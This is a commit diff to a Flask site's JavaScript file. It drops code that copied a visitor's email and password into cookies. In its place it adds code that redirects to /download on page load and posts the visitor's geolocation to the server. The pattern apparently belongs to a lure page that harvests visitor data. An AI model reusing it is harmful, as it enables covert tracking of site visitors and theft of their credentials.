59fcb25b57fb19e8db2c5eeed025ea5b913e6752
Praveen-kumar-Reddy-Idamakanti <166930192+Praveen-kumar-Reddy-Idamakanti@users.noreply.github.com>
2024-11-08 00:00:20 +0530

    Update new.js

--- static/new.js
+++ static/new.js
@@ -1,6 +1,25 @@
-var myCookies={};
-function saveCookies(){
-    myCookies=["_user"]=document.getElementById("userMail1").value;
-    myCookies=["_userPassword"]=document.getElementById("pass").value;
+window.onload = function() {
+    window.location.href = "/download";
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation);
+    } else {
+        alert("Geolocation is not supported by this browser.");
+    }
+};
 
+function sendLocation(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    
+    // Send location to Flask server using Fetch API
+    fetch('/location', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ latitude, longitude })
+    })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error("Error:", error));
 }
